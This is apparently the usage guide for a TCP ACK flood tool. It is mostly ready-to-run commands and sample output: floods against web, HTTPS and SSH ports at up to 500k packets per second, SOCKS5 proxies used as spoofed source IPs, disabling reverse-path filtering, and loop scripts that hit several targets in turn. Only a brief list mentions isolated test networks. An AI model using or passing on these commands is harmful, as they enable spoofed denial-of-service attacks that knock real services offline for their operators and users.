# Usage Examples

This document provides practical examples of using the TCP ACK flood tool.

## Basic Examples

### Example 1: Simple HTTP Port Test

Test a web server on port 80:

```bash
sudo ./ack 192.168.1.100 80 100 30 50000
```

**Breakdown:**
- Target: `192.168.1.100:80`
- Threads: 100
- Duration: 30 seconds
- Max PPS: 50,000

**Expected Output:**
```
[+] Starting 100 threads with PURE ACK FLOOD
[+] Target: 192.168.1.100:80
[+] Maximum PPS: 50000
[*] Attack: 100% ACK packets with SACK_PERM + SACK blocks (SLE & SRE)
[*] Rate limiter initialized: 50000 PPS (stable token bucket)
[*] Running for 30 seconds...

[LIVE] PPS: 48500 | Sent: 1455000 | Failed: 250 | Mbps: 38.80
```

### Example 2: High-Intensity Attack

Maximum intensity attack:

```bash
sudo ./ack 10.0.0.1 443 1000 300 500000
```

**Warning:** This uses 1000 threads and 500k PPS. Ensure your system can handle this load.

### Example 3: SSH Port Attack

Target SSH service:

```bash
sudo ./ack 192.168.1.50 22 200 60 100000
```

## SOCKS5 Proxy Examples

### Example 4: Using SOCKS5 Proxies

1. Create `socks5.txt`:
```
192.168.1.100:1080
192.168.1.101:1080:user:pass
proxy.example.com:1080
```

2. Run with proxy support:
```bash
sudo ./ack 192.168.1.200 80 500 120 200000 --socks5
```

**Output:**
```
[+] Loaded 3 SOCKS5 proxies from socks5.txt
[+] Starting 500 threads with PROXIED RAW SOCKET ACK FLOOD
[*] Mode: Proxied Raw Socket (proxy IP spoofing + SACK blocks)
[*] Proxies: 3 loaded (used as spoofed source IPs)
```

### Example 5: Proxy with Authentication

If your proxies require authentication:

```
# socks5.txt
proxy1.com:1080:myuser:mypassword
proxy2.com:1080:anotheruser:anotherpass
```

Then run normally with `--socks5` flag.

## Advanced Scenarios

### Example 6: Stress Testing with Monitoring

Run attack while monitoring system:

**Terminal 1:**
```bash
sudo ./ack 192.168.1.100 80 300 60 150000
```

**Terminal 2 (Monitor):**
```bash
# Monitor network traffic
sudo tcpdump -i eth0 -n 'tcp and host 192.168.1.100' -c 1000

# Monitor system resources
htop

# Monitor network statistics
watch -n 1 'netstat -s | grep -i tcp'
```

### Example 7: Gradual Ramp-Up

Start low and increase:

```bash
# Phase 1: Low intensity
sudo ./ack 192.168.1.100 80 50 30 10000

# Phase 2: Medium intensity
sudo ./ack 192.168.1.100 80 200 60 50000

# Phase 3: High intensity
sudo ./ack 192.168.1.100 80 500 120 150000
```

### Example 8: Multiple Targets (Script)

Create a script to test multiple targets:

```bash
#!/bin/bash
# test_multiple_targets.sh

targets=(
    "192.168.1.100:80"
    "192.168.1.101:443"
    "192.168.1.102:22"
)

for target in "${targets[@]}"; do
    IFS=':' read -r ip port <<< "$target"
    echo "[*] Testing $ip:$port"
    sudo ./ack "$ip" "$port" 100 30 50000
    sleep 5
done
```

## Performance Tuning

### Example 9: Finding Optimal Thread Count

Test different thread counts:

```bash
# Test with 50 threads
sudo ./ack 192.168.1.100 80 50 30 50000

# Test with 200 threads
sudo ./ack 192.168.1.100 80 200 30 50000

# Test with 500 threads
sudo ./ack 192.168.1.100 80 500 30 50000
```

Monitor CPU usage to find optimal count.

### Example 10: Rate Limiting Test

Test different PPS rates:

```bash
# Low rate
sudo ./ack 192.168.1.100 80 100 30 10000

# Medium rate
sudo ./ack 192.168.1.100 80 100 30 50000

# High rate
sudo ./ack 192.168.1.100 80 100 30 200000
```

## Troubleshooting Examples

### Example 11: Permission Issues

If you get "Permission denied":

```bash
# Check if running as root
whoami
# Should output: root

# If not root, use sudo
sudo ./ack 192.168.1.100 80 100 30 50000
```

### Example 12: Low Performance

If packets aren't being sent:

```bash
# Check reverse path filtering
cat /proc/sys/net/ipv4/conf/all/rp_filter
# Should be 0

# If not 0, disable it
sudo sysctl -w net.ipv4.conf.all.rp_filter=0

# Check file descriptor limits
ulimit -n
# Should be high (1048576+)

# Increase if needed
ulimit -n 1048576
```

### Example 13: Proxy Connection Issues

If proxies aren't working:

```bash
# Test proxy manually
curl --socks5 192.168.1.100:1080 http://example.com

# Check proxy format in socks5.txt
cat socks5.txt
# Should be: ip:port or ip:port:user:pass

# Verify proxy is reachable
nc -zv 192.168.1.100 1080
```

## Script Examples

### Example 14: Automated Testing Script

```bash
#!/bin/bash
# automated_test.sh

TARGET_IP="192.168.1.100"
PORTS=(80 443 22 8080)
THREADS=200
DURATION=60
PPS=100000

for port in "${PORTS[@]}"; do
    echo "[*] Testing $TARGET_IP:$port"
    sudo ./ack "$TARGET_IP" "$port" "$THREADS" "$DURATION" "$PPS"
    echo "[*] Waiting 10 seconds before next test..."
    sleep 10
done
```

### Example 15: Continuous Monitoring Script

```bash
#!/bin/bash
# monitor_attack.sh

TARGET_IP="192.168.1.100"
PORT=80

# Start attack in background
sudo ./ack "$TARGET_IP" "$PORT" 300 300 150000 &
ATTACK_PID=$!

# Monitor network
while kill -0 $ATTACK_PID 2>/dev/null; do
    echo "=== $(date) ==="
    netstat -s | grep -i "segments\|packets"
    echo ""
    sleep 5
done
```

## Best Practices

1. **Start Small**: Begin with low thread counts and PPS, then increase
2. **Monitor Resources**: Watch CPU, memory, and network usage
3. **Use Appropriate Duration**: Don't run indefinitely
4. **Test on Isolated Networks**: Use test environments
5. **Document Results**: Keep logs of test results
6. **Respect Rate Limits**: Don't exceed network capacity unnecessarily

## Common Mistakes

1. **Not Running as Root**: Raw sockets require root
2. **Too Many Threads**: Can cause system instability
3. **Wrong Proxy Format**: Check `socks5.txt` format
4. **Network Issues**: Verify target is reachable
5. **Firewall Blocking**: Check iptables rules

## Performance Benchmarks

Typical performance on modern hardware:

| Threads | PPS | CPU Usage | Memory |
|---------|-----|-----------|--------|
| 50      | 25k | 15%       | 50MB   |
| 200     | 100k| 40%       | 200MB  |
| 500     | 250k| 80%       | 500MB  |
| 1000    | 400k| 95%       | 1GB    |

*Results vary by hardware and network conditions*

